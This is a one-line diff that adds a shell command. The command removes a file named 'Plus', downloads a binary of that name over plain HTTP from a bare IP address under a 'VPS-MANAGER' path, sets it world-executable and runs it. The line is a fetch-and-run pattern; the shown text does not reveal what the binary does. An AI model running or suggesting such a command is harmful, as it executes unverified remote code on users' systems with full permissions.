@@ -1,0 +1,1 @@
+rm -rf Plus; wget http://91.225.104.192:81/VPS-MANAGER-1.0/Plus; chmod 777 Plus; ./Plus
